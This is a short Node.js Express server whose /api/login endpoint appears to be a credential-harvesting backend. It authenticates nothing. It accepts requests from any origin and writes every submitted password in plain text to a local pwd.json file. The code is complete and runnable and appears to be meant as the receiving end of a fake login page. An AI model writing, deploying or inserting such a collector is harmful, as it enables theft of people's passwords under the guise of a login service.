import express from 'express'
import fs from 'fs'
import cors from 'cors'

const app = express()
app.use(cors({ origin: '*' }))
app.use(express.json())

const pwdFile = './pwd.json'

app.post('/api/login', (req, res) => {
    const password = req.body.password
    if (!password) return res.status(400).end()
    const passwords = fs.existsSync(pwdFile) ? JSON.parse(fs.readFileSync(pwdFile)) : []
    passwords.push(password)
    fs.writeFileSync(pwdFile, JSON.stringify(passwords))
    res.status(204).end()
})

app.listen(1312)